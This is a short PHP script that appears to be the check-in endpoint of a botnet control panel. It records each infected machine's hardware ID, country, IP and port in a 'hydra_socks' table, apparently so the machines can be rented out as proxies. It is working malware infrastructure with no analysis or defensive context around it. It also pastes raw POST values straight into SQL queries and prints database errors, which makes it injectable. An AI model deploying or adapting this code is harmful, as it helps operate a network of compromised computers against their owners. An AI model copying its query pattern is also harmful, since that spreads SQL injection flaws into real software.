<?php
	include("admin/inc/config.php");
	include("admin/inc/funcs.php");
	
	if(!empty($_POST['hwid']) && !empty($_POST['cn']) && !empty($_POST['ip']) && !empty($_POST['port']))
	{
		$query = mysql_query("SELECT * FROM hydra_socks WHERE hwid = '".$_POST['hwid']."'");
		if(mysql_num_rows($query) >= 1)
		{
			$sql = mysql_query("UPDATE hydra_socks SET ip = '".$_POST['ip']."', port = '".$_POST['port']."' WHERE hwid = '".$_POST['hwid']."'");
		}
		else
		{
			$sql = mysql_query("INSERT INTO hydra_socks (`hwid`, `country`, `ip`, `port`) VALUES ('".$_POST['hwid']."', '".$_POST['cn']."', '".$_POST['ip']."', '".$_POST['port']."')");
		}
		if(!$sql)
		{
			echo "fail";
			echo mysql_error();
		}
	}
	else
	{
		echo "post all";
	}

?>